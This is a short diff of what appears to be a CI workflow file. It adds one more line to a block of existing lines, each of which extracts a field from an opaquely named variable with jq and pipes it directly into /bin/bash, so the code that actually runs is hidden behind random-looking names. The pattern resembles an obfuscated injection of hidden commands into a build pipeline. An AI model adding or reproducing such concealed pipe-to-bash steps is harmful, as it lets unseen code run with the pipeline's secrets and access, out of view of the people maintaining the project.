@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$pks56" | jq -r .px45598 | /bin/bash
           echo $timvz75 | jq -r .jzkm023 | /bin/bash
           echo $rh03021 | jq -r .nb3910 | /bin/bash
+          printf '%s' "$avy254" | jq -r .ps72707 | /bin/bash
 
       - name: Store results
         if: always()
